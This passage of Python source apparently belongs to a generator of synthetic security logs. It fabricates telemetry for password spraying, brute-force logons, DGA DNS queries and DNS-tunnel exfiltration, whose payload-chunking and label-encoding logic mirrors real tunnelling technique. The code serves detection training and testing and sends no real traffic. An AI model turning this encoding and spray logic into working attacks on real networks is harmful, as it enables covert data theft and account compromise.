                    s for s in self.scenario.environment.systems if s.type == "domain_controller"
                ]
                if dcs:
                    # Deterministic DC per source IP (mimics AD DC Locator caching)
                    dc_idx = _stable_seed(f"preferred_dc_{spray_src_ip}") % len(dcs)
                    dc_system = dcs[dc_idx]

            attempt_count = 0
            for tick_time in _iter_periodic_ticks(
                start, interval_sec, duration_sec, count, spec.jitter, rng
            ):
                self.state_manager.set_current_time(tick_time)

                # Success fires at exactly the requested attempt count,
                # regardless of which account the pattern would have selected
                if success_account and attempt_count == success_after:
                    target_user = scenario_users.get(success_account, actor)
                    self.activity_generator.generate_logon(
                        user=target_user,
                        system=system,
                        time=tick_time,
                        logon_type=spec.logon_type,
                        source_ip=spray_src_ip,
                    )
                    attempt_count += 1
                    malicious_event["success_account"] = success_account
                    malicious_event["success_at_attempt"] = attempt_count
                    break

                # Select target account based on pattern
                if spec.pattern == "spray":
                    target_account = accounts[attempt_count % len(accounts)]
                elif spec.pattern == "brute_force":
                    target_account = accounts[
                        min(
                            attempt_count // max(1, (spec.count or 100) // len(accounts)),
                            len(accounts) - 1,
                        )
                    ]
                else:  # stuffing
                    target_account = accounts[attempt_count % len(accounts)]

                target_user = scenario_users.get(target_account, actor)

                self.activity_generator.generate_failed_logon(
                    user=target_user,
                    system=system,
                    time=tick_time,
                    logon_type=spec.logon_type,
                    source_ip=spray_src_ip,
                    target_username=target_account,
                    dc_system=dc_system,
                )
                attempt_count += 1

            malicious_event["pattern"] = spec.pattern
            malicious_event["target_accounts"] = accounts
            malicious_event["attempt_count"] = attempt_count

        elif spec.type == "dga_queries":
            import random as _random

            from evidenceforge.events.contexts import DnsContext

            # Timing
            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
            interval_sec = parse_duration(spec.interval).total_seconds()
            duration_sec = None
            count = spec.count
            if spec.duration is not None:
                duration_sec = parse_duration(spec.duration).total_seconds()
            elif spec.end_time is not None:
                end_dt = self._parse_storyline_time(spec.end_time)
                duration_sec = (end_dt - start).total_seconds()

            # DGA RNG — separate from main rng for reproducibility
            dga_seed = spec.seed if spec.seed is not None else rng.randint(0, 2**31)
            dga_rng = _random.Random(dga_seed)

            # Rcode distribution
            rcode_dist = spec.rcode_distribution or {"NXDOMAIN": 0.95, "NOERROR": 0.05}
            rcode_names = list(rcode_dist.keys())
            rcode_weights = list(rcode_dist.values())

            _RCODE_MAP = {"NOERROR": 0, "NXDOMAIN": 3, "SERVFAIL": 2, "REFUSED": 5}
            _QTYPE_MAP = {"A": 1, "AAAA": 28, "TXT": 16, "CNAME": 5}

            query_src_ip = spec.source_ip or system.ip
            dns_server_ips = getattr(self.activity_generator, "_dns_server_ips", ["10.0.0.1"])

            query_count = 0
            nxdomain_count = 0
            domain_sample = []
            for tick_time in _iter_periodic_ticks(
                start, interval_sec, duration_sec, count, spec.jitter, rng
            ):
                self.state_manager.set_current_time(tick_time)

                # Generate random domain
                label_len = dga_rng.randint(*spec.length_range)
                label = "".join(dga_rng.choices(spec.charset, k=label_len))
                domain = f"{label}{spec.tld}"

                # Select rcode
                rcode_name = dga_rng.choices(rcode_names, weights=rcode_weights, k=1)[0]
                rcode_num = _RCODE_MAP.get(rcode_name, 3)

                answers = []
                ttls = []
                if rcode_name == "NOERROR" and spec.answer_ip:
                    answers = [spec.answer_ip]
                    ttls = [float(dga_rng.randint(60, 3600))]
                if rcode_name == "NXDOMAIN":
                    nxdomain_count += 1

                dns_server_ip = rng.choice(dns_server_ips)
                from evidenceforge.generation.activity.generator import _dns_rtt

                dns_ctx = DnsContext(
                    query=domain,
                    query_type="A",
                    qtype=1,
                    rcode=rcode_name,
                    rcode_num=rcode_num,
                    answers=answers,
                    TTLs=ttls,
                    trans_id=rng.randint(1, 65535),
                    AA=False,
                    RD=True,
                    RA=True,
                    rejected=False,
                    rtt=_dns_rtt(rng, dns_server_ip),
                )

                self.activity_generator.generate_connection(
                    src_ip=query_src_ip,
                    dst_ip=dns_server_ip,
                    time=tick_time,
                    dst_port=53,
                    proto="udp",
                    service="dns",
                    dns=dns_ctx,
                    emit_dns=False,
                    orig_bytes=rng.randint(40, 100),
                    resp_bytes=rng.randint(80, 400)
                    if rcode_name == "NOERROR"
                    else rng.randint(40, 80),
                    conn_state="SF",
                    duration=rng.uniform(0.001, 0.05),
                )
                query_count += 1
                if len(domain_sample) < 5:
                    domain_sample.append(domain)

            malicious_event["total_queries"] = query_count
            malicious_event["nxdomain_count"] = nxdomain_count
            malicious_event["domain_sample"] = domain_sample
            malicious_event["tld"] = spec.tld

        elif spec.type == "dns_tunnel":
            import base64 as _b64

            from evidenceforge.events.contexts import DnsContext
            from evidenceforge.generation.activity.network_params import (
                dns_tunnel_response_templates,
                dns_tunnel_rtt_range,
            )

            _QTYPE_MAP = {"TXT": 16, "NULL": 10, "CNAME": 5}
            _RCODE_MAP = {"NOERROR": 0}

            # Timing
            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
            interval_sec = parse_duration(spec.interval).total_seconds()
            duration_sec = None
            count = spec.count
            if spec.duration is not None:
                duration_sec = parse_duration(spec.duration).total_seconds()
            elif spec.end_time is not None:
                end_dt = self._parse_storyline_time(spec.end_time)
                duration_sec = (end_dt - start).total_seconds()

            query_src_ip = spec.source_ip or system.ip
            dns_server_ips = getattr(self.activity_generator, "_dns_server_ips", ["10.0.0.1"])

            # Generate or use payload
            if spec.payload:
                payload_bytes = spec.payload.encode("utf-8")
            else:
                payload_bytes = rng.randbytes(spec.payload_size)

            # Calculate bytes per label based on encoding
            if spec.encoding == "hex":
                bytes_per_label = spec.label_length // 2
            elif spec.encoding == "base32":
                bytes_per_label = (spec.label_length * 5) // 8
            else:  # base64
                bytes_per_label = (spec.label_length * 3) // 4
            bytes_per_label = max(1, bytes_per_label)

            # Chunk payload
            chunks = []
            for i in range(0, len(payload_bytes), bytes_per_label):
                chunks.append(payload_bytes[i : i + bytes_per_label])

            qtype_num = _QTYPE_MAP.get(spec.qtype, 16)
            min_rtt, max_rtt = dns_tunnel_rtt_range()
            response_templates = dns_tunnel_response_templates() or ["status={token}"]
            total_bytes = 0
            query_count = 0
            chunk_idx = 0
            tunnel_salt = rng.randbytes(4)

            for tick_time in _iter_periodic_ticks(
                start, interval_sec, duration_sec, count, spec.jitter, rng
            ):
                self.state_manager.set_current_time(tick_time)

                chunk = chunks[chunk_idx % len(chunks)]
                chunk_idx += 1
                sequence_mask = random.Random(
                    _stable_seed(
                        f"dns_tunnel_seq:{spec.base_domain}:{tunnel_salt.hex()}:{query_count}"
                    )
                ).getrandbits(32)
                sequence = (query_count ^ sequence_mask).to_bytes(4, "big", signed=False)
                pad_len = max(0, bytes_per_label - len(chunk) - len(sequence))
                padded_chunk = chunk + rng.randbytes(pad_len) + sequence

                # Encode chunk
                if spec.encoding == "hex":
                    encoded = padded_chunk.hex()
                elif spec.encoding == "base32":
                    encoded = _b64.b32encode(padded_chunk).decode("ascii").rstrip("=").lower()
                else:  # base64
                    encoded = (
                        _b64.urlsafe_b64encode(padded_chunk).decode("ascii").rstrip("=").lower()
                    )

                # Truncate to label_length
                encoded = encoded[: spec.label_length]
                tunnel_query = f"{encoded}.{spec.base_domain}"

                # TXT responses carry data back; CNAME/NULL are smaller
                if spec.qtype == "TXT":
                    resp_bytes = rng.randint(200, 2000)
                else:
                    resp_bytes = rng.randint(50, 200)
                response_token = f"{random.Random(_stable_seed(f'dns_tunnel_response:{spec.base_domain}:{query_count}:{tunnel_salt.hex()}')).getrandbits(32):08x}"
                response_template = rng.choice(response_templates)

                dns_ctx = DnsContext(
                    query=tunnel_query,
                    query_type=spec.qtype,
                    qtype=qtype_num,
                    rcode="NOERROR",
                    rcode_num=0,
                    answers=[response_template.replace("{token}", response_token)],
                    TTLs=[float(rng.randint(1, 10))],
                    trans_id=rng.randint(1, 65535),
                    AA=False,
                    RD=True,
                    RA=True,
                    rejected=False,
                    rtt=rng.uniform(min_rtt, max_rtt),
                )

                dns_server_ip = rng.choice(dns_server_ips)
                self.activity_generator.generate_connection(
                    src_ip=query_src_ip,
                    dst_ip=dns_server_ip,
                    time=tick_time,
                    dst_port=53,
                    proto="udp",
                    service="dns",
                    dns=dns_ctx,
                    emit_dns=False,
                    resp_bytes=resp_bytes,
                    duration=dns_ctx.rtt,
                )
                total_bytes += len(chunk)
                query_count += 1

            malicious_event["base_domain"] = spec.base_domain
            malicious_event["encoding"] = spec.encoding
            malicious_event["qtype"] = spec.qtype
            malicious_event["total_queries"] = query_count
            malicious_event["bytes_exfiltrated"] = total_bytes

        elif spec.type == "explicit_credentials":
            story_pid, _story_image = self._last_storyline_process_for_system(system)
            self.activity_generator.generate_explicit_credentials(
                user=actor,
                system=system,
                time=time,
                target_username=spec.target_username,
                target_server=spec.target_server or system.hostname,
                process_name=spec.process_name or r"C:\Windows\System32\runas.exe",
                process_pid=story_pid if story_pid > 0 else 0,
                source_ip=spec.source_ip or system.ip,
            )
            malicious_event["target_username"] = spec.target_username
            malicious_event["target_server"] = spec.target_server

        elif spec.type == "workstation_lock":
            sessions = self.state_manager.get_sessions_for_user(actor.username)
            session = next((s for s in sessions if s.system == system.hostname), None)
            logon_id = session.logon_id if session else "0x0"
            self.activity_generator.generate_workstation_lock(
                user=actor,
                system=system,
                time=time,
                logon_id=logon_id,
            )

        elif spec.type == "workstation_unlock":
            sessions = self.state_manager.get_sessions_for_user(actor.username)
            session = next((s for s in sessions if s.system == system.hostname), None)
            logon_id = session.logon_id if session else "0x0"
            self.activity_generator.generate_workstation_unlock(
                user=actor,
                system=system,
                time=time,
                logon_id=logon_id,
            )

        elif spec.type == "raw":
            self.activity_generator.generate_raw(
                time=time,
                target_format=spec.target_format,
                fields=spec.fields,
                system=system,
            )
            malicious_event["target_format"] = spec.target_format

        return malicious_event

    def _resolve_firewall_interface(self, ip: str) -> str:
        """Resolve an IP to a firewall interface name using scenario network config."""
        import ipaddress as _ipaddress

        if not self.scenario.environment.network:
            return "outside"
        fw_sensor = next(
            (s for s in self.scenario.environment.network.sensors if s.type == "firewall"),
            None,
        )
        interfaces = fw_sensor.interfaces if fw_sensor else {}
        for seg in self.scenario.environment.network.segments:
            try:
                if _ipaddress.ip_address(ip) in _ipaddress.ip_network(seg.cidr, strict=False):
                    return interfaces.get(seg.name, seg.name)
            except (ValueError, KeyError):
                continue
        return interfaces.get("_default", "outside")

    def _get_firewall_deny_conn_state(self) -> str:
        """Get the conn_state for denied connections based on firewall drop_mode."""
        if not self.scenario.environment.network:
            return "S0"
        fw_sensor = next(
            (s for s in self.scenario.environment.network.sensors if s.type == "firewall"),
            None,
        )
        if fw_sensor and fw_sensor.drop_mode == "reject":
            return "REJ"
        return "S0"

    @staticmethod
    def _extract_output_file(command_line: str, os_category: str) -> str | None:
        """Extract output file path from a command line string.

        Detects common output file patterns in PowerShell, cmd, and Linux commands.
        Returns the file path if found, None otherwise.
        """
        patterns = [
            r'Export-Csv\s+[\'"]?([^\s\'">;]+)',  # PowerShell Export-Csv
            r'-OutFile\s+[\'"]?([^\s\'">;]+)',  # PowerShell -OutFile
            r'Out-File\s+[\'"]?([^\s\'">;]+)',  # PowerShell Out-File
            r'>\s*[\'"]?([^\s\'">;]+)',  # Shell redirect >
            r'-o\s+[\'"]?([^\s\'">;]+)',  # Common -o flag
            r'--output[= ]\s*[\'"]?([^\s\'">;]+)',  # --output flag
        ]
        for pattern in patterns:
            match = re.search(pattern, command_line, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    @staticmethod
    def _extract_scp_target(command_line: str, os_category: str) -> str | None:
        """Extract the remote host from a Linux scp command line."""
        if os_category != "linux":
            return None
        try:
            parts = shlex.split(command_line)
        except ValueError:
            parts = command_line.split()
        if not parts:
            return None
        exe = parts[0].rsplit("/", 1)[-1].lower()
        if exe != "scp":
            return None
        for token in parts[1:]:
            if token.startswith("-") or ":" not in token:
                continue
            remote, _path = token.split(":", 1)
            if not remote:
                continue
            host = remote.rsplit("@", 1)[-1].strip("[]")
            if host:
                return host
        return None

    @staticmethod
    def _extract_http_url(command_line: str) -> str | None:
        """Extract the first HTTP(S) URL from a storyline process command line."""
        match = re.search(r"https?://[^\s'\"),;]+", command_line, re.IGNORECASE)
        if not match:
            return None
        return match.group(0).rstrip(".")

    def _resolve_storyline_network_target(self, target: str) -> str | None:
        """Resolve a storyline command target host/IP to an environment IP when possible."""
        lowered = target.rstrip(".").lower()
        if re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", lowered):
            return target
        ad_domain = getattr(self, "_ad_domain", "")
        for system in self.scenario.environment.systems:
            candidates = {
                system.hostname.lower(),
                system.ip,
            }
            if ad_domain:
                candidates.add(f"{system.hostname}.{ad_domain}".lower())
            if lowered in candidates:
                return system.ip
        return None

    def _parse_storyline_time(self, time_str: str) -> datetime:
        """Parse storyline event time to absolute datetime.

        Supports:
        - ISO 8601 absolute time: "2024-01-15T10:30:00Z"
        - Relative offset (duration): "+2h30m"
        - Relative offset (seconds): "+7200"

        Args:
            time_str: Time string to parse

        Returns:
            Absolute datetime (UTC)

        Raises:
            ValueError: If time format is invalid
        """
        if time_str[0].isdigit() and len(time_str) > 10:
            return parse_iso8601(time_str)

        if time_str.startswith("+"):
            offset_str = time_str[1:]
            if offset_str.isdigit():
                offset = timedelta(seconds=int(offset_str))
            else:
                offset = parse_duration(offset_str)
            return self.start_time + offset

        raise ValueError(f"Invalid storyline time format: {time_str}")

    def _make_domain_sid(self, rid: int | None = None) -> str:
        """Generate a SID using the scenario's domain SID prefix."""
        rng = _get_rng()
        for sid in self.activity_generator.sid_registry.values():
            if sid.startswith("S-1-5-21-") and sid.count("-") == 7:
                prefix = "-".join(sid.split("-")[:7])
                return f"{prefix}-{rid or rng.randint(1100, 9999)}"
        return f"S-1-5-21-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rid or rng.randint(1100, 9999)}"

    def _generate_encoded_powershell(self, seed: int) -> str:
        """Generate a realistic base64-encoded PowerShell command.

        PowerShell -enc expects UTF-16LE encoded base64.
        """
        rng = _get_rng()
        cmd = rng.choice(POWERSHELL_COMMANDS)
        return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
